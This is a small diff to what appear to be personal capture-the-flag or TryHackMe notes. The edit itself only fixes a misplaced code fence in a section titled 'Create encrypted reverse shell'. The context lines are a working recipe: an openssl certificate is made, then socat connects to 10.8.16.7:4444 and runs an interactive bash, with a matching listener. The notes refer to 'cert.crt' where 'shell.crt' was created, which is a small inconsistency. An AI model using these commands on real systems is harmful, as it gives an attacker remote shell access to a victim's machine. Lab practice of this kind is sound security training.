@@ -14,7 +14,7 @@
 ##### Create encrypted reverse shell
 ```
 openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 999 -out shell.crt  // Creating the key, creates "shell.crt, shell.key"
-cat shell.key cert.crt > shell.pem```  // Combine keys
+cat shell.key cert.crt > shell.pem  // Combine keys
 socat OPENSSL-CONNECT:10.8.16.7:4444 EXEC:"bash -li",pty,stderr,sigint,setsid,sane // Connect
 socat -d -d OPENSSL-LISTEN:4444,cert=/home/edu/THM/EXPLOITS/shell.pem,verify=0// Listen
 ```
